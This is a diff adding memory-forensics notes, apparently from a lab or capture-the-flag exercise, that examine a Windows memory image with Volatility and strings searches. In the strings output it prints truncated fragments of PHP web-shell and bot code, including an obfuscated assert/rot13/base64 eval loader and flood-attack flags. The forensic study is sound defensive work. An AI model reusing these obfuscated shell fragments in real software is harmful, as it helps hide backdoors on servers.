@@ -429,3 +429,415 @@ TreeDepth Offset      Base           Size       Name             Path           
 0         0x11f51bf30 0xf8800192e000 0x2a000    cdrom.sys        \\SystemRoot\\system32\\DRIVERS\\cdrom.sys        Disabled
 0         0x11fe977c0 0xf88006174000 0x71000    spsys.sys        \\SystemRoot\\system32\\drivers\\spsys.sys        Disabled
 ```
+
+### strings
+``` data
+$ strings -td -a gotham.raw > strings.txt
+$ strings -td -el -a gotham.raw >> strings.txt
+$ grep -iE "http|\.exe|[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" strings.txt > filtered_strings.txt
+$ vol -f gotham.raw windows.string --strings-file filtered_strings.txt > processed_strings.txt
+$ vim processed_strings.txt
+$ cat processed_strings.txt | grep -C 10 -F "216.58.196.163"
+http://www.certicamara.com/dpc/0Z
+	0x1176db7d0	FREE MEMORY
+https://assets.msn.com/bundles/v1/edgeChromium/latest/codex-bing-chat.467deeb9891b8e64b359.js[REMOVED]
+	0x1176e4018	FREE MEMORY
+https://%s.chromiumapp.org/
+	0x1176f0a10	FREE MEMORY
+MICROSOFT.GROUPPOLICY.INTEROP, VERSION=2.0.0.0, CULTURE=NEUTRAL, PUBLICKEYTOKEN=31BF3856AD364E35, PROCESSORARCHITECTURE=X86
+	0x1176f93da	kernel:0xf8a003eff000
+GAAAABIAAABodHRwczovL2dvb2dsZS5jb20AAA==",false]httpsbeacons.gcp.gvt2.com
+	0x117730afa	FREE MEMORY
+216.58.196.163nel
+	0x117730b47	FREE MEMORY
+IAAAABwAAABodHRwczovL3N0dXhuZXQ5OTkuZ2l0aHViLmlv",false]httpsyihui.org
+	0x117730b7f	FREE MEMORY
+104.21.87.33cf-nel
+	0x117730bc9	FREE MEMORY
+IAAAABwAAABodHRwczovL3N0dXhuZXQ5OTkuZ2l0aHViLmlv",false]httpscdnjs.cloudflare.com
+	0x117730bfb	FREE MEMORY
+104.17.25.14cf-nel
+	0x117730c50	FREE MEMORY
+GAAAABIAAABodHRwczovL2dvb2dsZS5jb20AAA==",true]httpsbeacons.gcp.gvt2.com
+```
+- "GAAAABIAAABodHRwczovL2dvb2dsZS5jb20AAA==" decodes to "[REMOVED]hxxps[://]google[.]com[REMOVED]"
+- "IAAAABwAAABodHRwczovL3N0dXhuZXQ5OTkuZ2l0aHViLmlv" decodes to "[REMOVED]hxxps[://]stuxnet999[.]github[.]io":
+	- doesn't seem malicious; clear on VT
+	- leads to "Abhiram's blog"
+- all strings in free memory, close to each other
+
+``` data
+$ cat processed_strings.txt | grep -C 30 -F "142.250.196.163"
+[REMOVED]
+http://unisolated.invalid
+	0x25e13c19	FREE MEMORY
+[REMOVED]
+1.0.0.6
+	0x25e5d150	FREE MEMORY
+https://clients2.google.com/service/update2/crx
+	0x25e5d1b0	FREE MEMORY
+https://www.googleapis.com/auth/chromewebstore
+	0x25e5d270	FREE MEMORY
+https://www.googleapis.com/auth/sierrasandbox
+	0x25e5d2a0	FREE MEMORY
+https://www.googleapis.com/auth/sierra
+	0x25e5d2d0	FREE MEMORY
+https://www.googleapis.com/auth/sierra
+	0x25e5d330	FREE MEMORY
+https://www.googleapis.com/auth/chromewebstore
+	0x25e5d870	FREE MEMORY
+https://www.googleapis.com/auth/sierrasandbox
+	0x25e5d8a0	FREE MEMORY
+https://chrome.google.com/webstore
+	0x25e5df30	FREE MEMORY
+142.250.196.163
+	0x25e62228	FREE MEMORY
+[REMOVED]
+HTTP/1.1 200
+	0x47ee001c	FREE MEMORY
+content-security-policy-report-only:require-trusted-types-for 'script'; report-uri https://csp.withgoogle.com/csp/boq-infra/identity-boq-js-css-signers
+	0x47ee0053	FREE MEMORY
+report-to:{"group":"boq-infra/identity-boq-js-css-signers","max_age":2592000,"endpoints":[{"url":"https://csp.withgoogle.com/csp/report-to/boq-infra/identity-boq-js-css-signers"}]}
+	0x47ee016f	FREE MEMORY
+http://o.pki.goog/wr20%
+	0x47ee054e	FREE MEMORY
+http://i.pki.goog/wr2.crt0;
+	0x47ee0571	FREE MEMORY
+http://c.pki.goog/wr2/oQ6nyr8F0m0.crl0
+	0x47ee05ee	FREE MEMORY
+http://i.pki.goog/r1.crt0+
+	0x47ee0ad5	FREE MEMORY
+http://c.pki.goog/r/r1.crl0
+	0x47ee0b00	FREE MEMORY
+https://www.google.com/favicon.ico
+	0x47ee9b80	FREE MEMORY
+142.250.196.163
+	0x47ef5228	FREE MEMORY
+WS_HTTP2_INITIAL_CONNECTION__new
+	0x47f1a070	FREE MEMORY
+WS_HTTP2_CONNECTION__Initialize
+	0x47f1a098	FREE MEMORY
+I_RpcTransGetHttpCredentials
+	0x47f1a0b8	FREE MEMORY
+I_RpcTransFreeHttpCredentials
+	0x47f1a0d8	FREE MEMORY
+HttpSendIdentifyResponse
+	0x47f1a148	FREE MEMORY
+HTTP_TurnOnOffKeepAlives
+	0x47f1a168	FREE MEMORY
+HTTP_SyncSend
+	0x47f1a188	FREE MEMORY
+HTTP_SyncRecv
+	0x47f1a198	FREE MEMORY
+HTTP_SetLastBufferToFree
+	0x47f1a1a8	FREE MEMORY
+HTTP_ServerListen
+	0x47f1a1c8	FREE MEMORY
+HTTP_Send
+	0x47f1a1e0	FREE MEMORY
+HTTP_Recv
+	0x47f1a1f0	FREE MEMORY
+HTTP_QueryLocalAddress
+	0x47f1a200	FREE MEMORY
+HTTP_QueryClientIpAddress
+	0x47f1a218	FREE MEMORY
+[REMOVED]
+```
+``` data
+$ cat processed_strings.txt | grep -c "216.58.200.132"
+23
+$ cat processed_strings.txt | grep -C 6 -F "216.58.200.132"
+[REMOVED]
+216.58.200.132
+	0x22a60248	kernel:0xf9800baeb000
+IHttpHandler
+	0x22a6a617	FREE MEMORY
+IHttpAsyncHandler
+	0x22a6a624	FREE MEMORY
+[REMOVED]
+https://api.webxtsvc.microsoft.com/crypto
+	0x2937b980	FREE MEMORY
+https://api.webxtsvc.microsoft.com
+	0x2937b9b0	FREE MEMORY
+[REMOVED]
+185.199.110.133
+	0x293bf2ec	FREE MEMORY
+[REMOVED]
+HttpCache.CreateDiskEntry
+	0x3c4f9c70	FREE MEMORY
+HttpCache.AddTransactionToEntry
+	0x3c4f9e90	FREE MEMORY
+216.58.200.132
+	0x3c515328	kernel:0xf9800bacb000
+Net.DNS.DnsTask.SvcbHttpsTransactionError
+	0x3c5187f0	FREE MEMORY
+Net.DNS.HTTPSSVC.RecordHttps.Ins
+	0x3c518fe0	FREE MEMORY
+[REMOVED]
+https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML
+	0x3decfbb8	FREE MEMORY
+https
+	0x3ded1338	FREE MEMORY
+https
+	0x3ded1780	FREE MEMORY
+216.58.200.132:443
+	0x3ded18a8	FREE MEMORY
+https
+	0x3ded1c08	FREE MEMORY
+https
+	0x3ded1c50	FREE MEMORY
+https://csp.withgoogle.com/csp/report-to/youtube
+[REMOVED]
+Systemroot%\system32\wbem\wmiapsrv.exe,-111
+	0x975eace8	kernel:0xf8a007d41000
+PROGRAMFILES%\Windows Media Player\wmpnetwk.exe,-102
+	0x975eaeb0	kernel:0xf8a007d41000
+systemroot%\system32\SearchIndexer.exe,-104
+	0x975ebb70	kernel:0xf8a007d41000
+216.58.200.132
+	0x97603220	kernel:0xf9800badf000
+[REMOVED]
+_stp.exe
+	0x9bb33080	FREE MEMORY
+msiexec.exe
+	0x9bb33618	FREE MEMORY
+track_%d+%.exe
+	0x9bb33d7a	FREE MEMORY
+216.58.200.132
+	0x9bb53198	kernel:0xf9800bae5000
+ComSpec=C:\Windows\system32\cmd.exe
+	0x9bb569c6	FREE MEMORY
+PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+	0x9bb56af0	FREE MEMORY
+[REMOVED]
+https:\/\/[^:]+
+	0xa635dcb0	FREE MEMORY
+[REMOVED]
+c:\calrec\quotes"gotobrowser("http://www.more4apps.com/
+	0xa6beb879	FREE MEMORY
+[REMOVED]
+botadmin=falsedoudpflood=falsedohttpflood=falsedohttpsflood=false
+	0xa83351f5	FREE MEMORY
+echo"<title>+[nofree2015]+</title>";$infozip=`unzip-v`;$target=$_server["http_host"];$cr0t=$_server["request_uri"];$bodymsg="hajarkang!\n$target$
+	0xa8335ca8	FREE MEMORY
+Vnif(!isset($_session[md5($_server['http_host'])]))if(empty($md5_pass)||(isset($_post['pass'])&&(md5($_post['pass'])==$md5_pass)))$_session[md5($_server['
+	0xa8335e1b	FREE MEMORY
+[REMOVED]
+```
+- *wmiapsrv.exe*
+- *wmpnetwk.exe*
+- *SearchIndexer.exe*
+- PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+- `https:\/\/[^:]+`
+
+``` data
+$ cat strings.txt | grep -c -F -e "PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC"
+716
+$ cat strings.txt | grep -B 1 -A 5 -F -e "PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC"
+[REMOVED]
+--
+587971207 Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
+587971312 PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+587971374 PROCESSOR_ARCHITECTURE=AMD64
+587971403 PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 154 Stepping 3, GenuineIntel
+587971476 PROCESSOR_LEVEL=6
+587971494 PROCESSOR_REVISION=9a03
+587971518 ProgramData=C:\ProgramData
+--
+602128512 CommonProgramW6432=C:\Program Files\Common Files
+602128576 PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+602134046       lsf
+602136603 \$0H
+602136628 L$@H
+602136773 L$(I
+602136833 D$(H
+--
+642719872 CommonProgramW6432=C:\Program Files\Common Files
+642719936 PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+642720512 https
+642720544 http
+642732131 !:#S
+642732585 ";"
+642732593 ";"
+[REMOVED]
+```
+
+``` data
+$ cat strings.txt | grep -F -C 50 -e ";\$target=\$_server["
+2821937544 1c4secinfo';if(!empty($_post['a'])&&function_exists('action'.$_post['a']))call_user_func('action'.$_post['a']);exit;
+2821937696 'Xerror_reporting(0);$strings="as";$strings.="sert";if(!@$mdc96972){$mdc96972=1;@$strings(str_rot13('riny(onfr64_qrpbqr("
+2821937852 K'M)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(pecqmpgzxdrnoomtjdwqtfuwgmjucbrqlcx.substr(0,4))){returntrue}returnfalse}
+2821938012 +j7c.j9m+j7c.z69),j7c.a69),chrome[(j7c.a2m+j7c.w69+j7c.l4m)][(j7c.c9m+j7c.q4m+j7c.e69+j7c.m69)]({url:aurl}));}catch(q1){};
+2821938171 [$_k=$jfthenifprocessexists($uf)thenprocessclose($uf)endifendifif$al=$jfthenifprocessexists($ic)thenprocessclose($ic)endifendifwendendif
+2821938344      echo"<title>+[nofree2015]+</title>";$infozip=`unzip-v`;$target=$_server["http_host"];$cr0t=$_server["request_uri"];$bodymsg="hajarkang!\n$target$
+2821938510 K0J/S"AA
+2821938527 ivarsf=newstring();};hi=58441;hi++;this.tl="tl";uy();var_h=newarray();this.wt=4818;this.wt++;window.onload=q;varbn={lb:15746};this.ku=32622;this.ku-=97;
+2821938715 Vnif(!isset($_session[md5($_server['http_host'])]))if(empty($md5_pass)||(isset($_post['pass'])&&(md5($_post['pass'])==$md5_pass)))$_session[md5($_server['
+2821938907 if(godsylx0()==509){uhmekal5["d"+mmibji0()+azuldy()+'e'+izsawoq6()+kekwatolg0+imryxfu()+'i'+yrefawy4()+efnyna()](wdoqyzc9);}catch(jdikgomq){}varrbmfbxp=568;
+2821939101 vremyaprishlovgostiotpravitsyadefrodmands.create=function(){vremyaprishlovgostiotpravitsyadefpublis
+```
+
+``` data
+$ cat strings.txt | grep -F -C 2 -e "com."
+[REMOVED]
+4696562601 com.microsoft.ieonline
+4696562703 net.azureedge.edgestatic
+[REMOVED]
+4706002485 uk.co.airbnb
+4706002567 ve.co.airbnb
+4706002649 com.airbnb
+4706002727 ar.com.airbnb
+4706002811 au.com.airbnb
+4706002895 bo.com.airbnb
+4706002979 br.com.airbnb
+4706003063 bz.com.airbnb
+4706003147 co.com.airbnb
+4706003231 ec.com.airbnb
+4706003315 gt.com.airbnb
+4706003399 hk.com.airbnb
+4706003483 hn.com.airbnb
+4706003567 hr.com.airbnb
+4706003651 kh.com.airbnb
+4706003735 mt.com.airbnb
+4706003819 my.com.airbnb
+4706003903 ni.com.airbnb
+4706003987 pa.com.airbnb
+4706004071 pe.com.airbnb
+4706004155 ph.com.airbnb
+4706004239 py.com.airbnb
+4706004323 sg.com.airbnb
+4706004407 sv.com.airbnb
+4706004491 tr.com.airbnb
+4706004575 tw.com.airbnb
+4706004659 ua.com.airbnb
+4706004743 vn.com.airbnb
+4706004827 cz.airbnb
+4706004903 de.airbnb
+[REMOVED]
+```
+- why would domains be in reverse order?
+
+### getting process list
+``` python
+(layer_name) >>> hex(self.context.symbol_space.get_symbol("symbol_table_name1!PsActiveProcessHead").address)
+'0x21b940'
+(layer_name) >>> dt("symbol_table_name1!_LIST_ENTRY", 0xf8000281e000+0x21b940)
+symbol_table_name1!_LIST_ENTRY (16 bytes) @ 0xf80002a39940:
+  0x0 :   Flink     *symbol_table_name1!_LIST_ENTRY     0x468b4d000000 (unreadable pointer)
+  0x8 :   Blink     *symbol_table_name1!_LIST_ENTRY     0xc8d4b10568b (unreadable pointer)
+```
+- pointer has been deleted
+
+### atom table
+``` data
+$ vol -f gotham.raw windows.poolscanner | grep -i -e "atom"
+symbol_table_name1!_RTL_ATOM_TABLE	0x1e59c4b	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0x1e59c9f	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0x2ba9a17	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0xefcc000	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0xf00a000	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0xf0f8a50	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0x318bb8a0	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0x354e6860	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0x39cf3a50	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0x46017000	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0x49067000	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0x7644da50	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0x764db6e5	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0x765dcdbb	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0x765dce0f	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0x76acf10e	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0x76adf93e	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0x77370000	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0x773e1225	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0x7a49d000	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0x8802e000	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0x90d4e9c0	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0x9126da50	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0x9317ca50	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0x94999a50	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0x9540c000	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0x95fa4000	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0x9a4b5000	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0xa5db8abf	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0xa8e18000	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0xb27d4a50	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0xb636d000	memory_layer	N/A
+symbol_table_name1!_RTL_ATOM_TABLE	0xdeb67ebf	memory_layer	N/A
+```
+``` python
+(memory_layer) >>> db(0xefcc000)
+0xefcc000    00 04 5b 03 41 74 6d 54 00 00 00 00 00 00 00 00    ..[.AtmT........
+0xefcc010    c0 e2 4d 06 80 fa ff ff 98 05 00 00 00 00 00 00    ..M.............
+0xefcc020    41 74 6f 6d 00 00 00 00 00 00 00 00 00 00 00 00    Atom............
+0xefcc030    30 b6 f4 07 a0 f8 ff ff 55 00 78 00 53 00 75 00    0.......U.x.S.u.
+0xefcc040    62 00 63 00 6c 00 61 00 73 00 73 00 49 00 6e 00    b.c.l.a.s.s.I.n.
+0xefcc050    66 00 6f 00 00 00 6f 00 00 00 65 00 00 00 00 00    f.o...o...e.....
+0xefcc060    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
+0xefcc070    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
+(memory_layer) >>> dt("symbol_table_name1!_RTL_ATOM_TABLE", 0xefcc020)
+symbol_table_name1!_RTL_ATOM_TABLE (112 bytes) @ 0xefcc020:
+   0x0 :   Signature           symbol_table_name1!unsigned long             1836020801
+   0x8 :   CriticalSection     symbol_table_name1!_RTL_CRITICAL_SECTION     offset: 0xefcc028
+  0x30 :   RtlHandleTable      symbol_table_name1!_RTL_HANDLE_TABLE         offset: 0xefcc050
+  0x60 :   NumberOfBuckets     symbol_table_name1!unsigned long             0
+  0x68 :   Buckets             symbol_table_name1!array                     ['0x0 (null pointer)']
+(memory_layer) >>> db(0xf00a000)
+0xf00a000    00 03 5b 03 41 74 6d 54 00 00 00 00 00 00 00 00    ..[.AtmT........
+0xf00a010    c0 e2 4d 06 80 fa ff ff 98 05 00 00 00 00 00 00    ..M.............
+0xf00a020    41 74 6f 6d 00 00 00 00 00 00 00 00 00 00 00 00    Atom............
+0xf00a030    20 05 cb 02 a0 f8 ff ff 55 00 78 00 53 00 75 00    ........U.x.S.u.
+0xf00a040    62 00 63 00 6c 00 61 00 73 00 73 00 49 00 6e 00    b.c.l.a.s.s.I.n.
+0xf00a050    66 00 6f 00 00 00 6f 00 00 00 65 00 00 00 00 00    f.o...o...e.....
+0xf00a060    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
+0xf00a070    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
+(memory_layer) >>> dt("symbol_table_name1!_RTL_ATOM_TABLE", 0xf00a020)
+symbol_table_name1!_RTL_ATOM_TABLE (112 bytes) @ 0xf00a020:
+   0x0 :   Signature           symbol_table_name1!unsigned long             1836020801
+   0x8 :   CriticalSection     symbol_table_name1!_RTL_CRITICAL_SECTION     offset: 0xf00a028
+  0x30 :   RtlHandleTable      symbol_table_name1!_RTL_HANDLE_TABLE         offset: 0xf00a050
+  0x60 :   NumberOfBuckets     symbol_table_name1!unsigned long             0
+  0x68 :   Buckets             symbol_table_name1!array                     ['0x0 (null pointer)']
+(memory_layer) >>> list = [0x1e59c4b,0x1e59c9f,0x2ba9a17,0xefcc000,0xf00a000,0xf0f8a50,0x318bb8a0,0x354e6860,0x39cf3a50,0x46017000,0x49067000,0x7644da50,0x764db6e5,0x765dcdbb,0x765dce0f,0x76acf10e,0x76adf93e,0x77370000,0x773e1225,0x7a49d000,0x8802e000,0x90d4e9c0,0x9126da50,0x9317ca50,0x94999a50,0x9540c000,0x95fa4000,0x9a4b5000,0xa5db8abf,0xa8e18000,0xb27d4a50,0xb636d000,0xdeb67ebf]
+(memory_layer) >>> for entry in list:
+...     atom_table = self.context.object("symbol_table_name1!_RTL_ATOM_TABLE", layer_name="memory_layer", offset=entry+0x20)
+...     if atom_table.Signature == 1836020801:
+...             if atom_table.NumberOfBuckets != 0:
+...                     dt(atom_table)
+...
+symbol_table_name1!_RTL_ATOM_TABLE (112 bytes) @ 0x94999a70:
+   0x0 :   Signature           symbol_table_name1!unsigned long             1836020801
+   0x8 :   CriticalSection     symbol_table_name1!_RTL_CRITICAL_SECTION     offset: 0x94999a78
+  0x30 :   RtlHandleTable      symbol_table_name1!_RTL_HANDLE_TABLE         offset: 0x94999aa0
+  0x60 :   NumberOfBuckets     symbol_table_name1!unsigned long             8192051
+  0x68 :   Buckets             symbol_table_name1!array                     ['0x6f0000']
+symbol_table_name1!_RTL_ATOM_TABLE (112 bytes) @ 0x95fa4020:
+   0x0 :   Signature           symbol_table_name1!unsigned long             1836020801
+   0x8 :   CriticalSection     symbol_table_name1!_RTL_CRITICAL_SECTION     offset: 0x95fa4028
+  0x30 :   RtlHandleTable      symbol_table_name1!_RTL_HANDLE_TABLE         offset: 0x95fa4050
+  0x60 :   NumberOfBuckets     symbol_table_name1!unsigned long             6619250
+  0x68 :   Buckets             symbol_table_name1!array                     ['0x100730000']
+symbol_table_name1!_RTL_ATOM_TABLE (112 bytes) @ 0x9a4b5020:
+   0x0 :   Signature           symbol_table_name1!unsigned long             1836020801
+   0x8 :   CriticalSection     symbol_table_name1!_RTL_CRITICAL_SECTION     offset: 0x9a4b5028
+  0x30 :   RtlHandleTable      symbol_table_name1!_RTL_HANDLE_TABLE         offset: 0x9a4b5050
+  0x60 :   NumberOfBuckets     symbol_table_name1!unsigned long             8192051
+  0x68 :   Buckets             symbol_table_name1!array                     ['0x100730000']
+```
+
+### MFT
+``` data
+$ vol -r csv -f gotham.raw windows.mftscan.MFTScan > mftscan.csv
+$ csvtool col 3,4,5,6,8,13 mftscan.csv | csvtool readable - > mft_readable.txt
+$ cat mft_readable.txt | grep -i -F ".lnk" | grep -v -F "~"
+[REMOVED]
+FILE        21719         2          File     FILE_NAME            Remote Desktop Connection.lnk
+[REMOVED]
+FILE        21753         2          File     FILE_NAME            Memory Diagnostics Tool.lnk
+[REMOVED]
+```
+- remote desktop?
+- memory diagnostics?
+
+### registry
+
